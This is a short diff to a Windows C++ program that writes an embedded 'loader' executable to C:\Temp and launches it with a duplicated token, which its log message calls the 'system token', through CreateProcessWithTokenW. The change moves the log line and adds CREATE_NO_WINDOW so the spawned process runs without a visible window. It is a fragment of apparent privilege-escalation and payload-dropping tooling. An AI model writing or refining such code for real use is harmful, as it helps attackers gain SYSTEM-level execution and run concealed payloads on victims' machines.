@@ -22,20 +22,20 @@ int wmain() {
 	outfile.write(&loader[0], sizeof(loader));
 	outfile.close();
 
+	Log("[*] Attempting to spawn loader with system token.", componentName);
+
 	STARTUPINFOW si;
 	PROCESS_INFORMATION pi;
 	ZeroMemory(&si, sizeof(si));
 	ZeroMemory(&pi, sizeof(pi));
 	si.cb = sizeof(si);
 
-	Log("[*] Attempting to spawn loader with system token.", componentName);
-
 	if (!CreateProcessWithTokenW(
 		hDuplicateToken,
 		LOGON_WITH_PROFILE,
 		L"C:\\Temp\\loader.exe",
 		NULL,
-		0,
+		CREATE_NO_WINDOW,
 		NULL,
 		NULL,
 		&si,
